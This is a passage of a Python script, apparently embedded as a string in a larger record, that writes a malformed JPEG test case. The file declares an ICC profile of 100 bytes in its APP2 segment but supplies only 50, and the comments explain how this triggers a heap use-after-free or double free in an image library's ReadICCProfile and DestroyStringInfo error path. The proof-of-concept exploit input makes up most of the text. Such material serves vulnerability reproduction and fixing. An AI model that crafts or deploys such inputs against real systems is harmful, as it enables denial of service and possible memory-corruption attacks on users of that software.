b"\\xFF\\xE2")  # APP2 marker\n    \n    # Length field: We claim a large profile, but will truncate the data\n    # Length includes the 2-byte length field itself + 12-byte ICC_PROFILE string + 2 bytes (id+markers) + profile data\n    # We need length > 14 to pass the check at line 523\n    profile_data_size = 100  # Claim we have 100 bytes of profile data\n    total_length = 2 + 12 + 2 + profile_data_size\n    f.write(struct.pack(">H", total_length))\n    \n    # ICC_PROFILE magic string (12 bytes)\n    f.write(b"ICC_PROFILE\\x00")\n    \n    # Sequence number and total markers\n    f.write(b"\\x01")  # id (sequence number)\n    f.write(b"\\x01")  # markers (total number of markers)\n    \n    # Write only partial profile data to trigger EOF during reading\n    # This will cause ReadICCProfile to free the profile at line 569\n    # but error_manager->profile is not set to NULL\n    partial_data_size = 50  # Only write 50 bytes instead of claimed 100\n    f.write(b"A" * partial_data_size)\n    \n    # Abruptly end the file here - this causes EOF during ICC profile reading\n    # The profile gets freed in ReadICCProfile but error_manager->profile isn\'t nulled\n    # Then the EOF error triggers the setjmp handler which tries to free it again\n\nprint(f"Generated malformed JPEG testcase at {output_path}")\nprint(f"Expected behavior: heap-use-after-free in DestroyStringInfo")\n'}


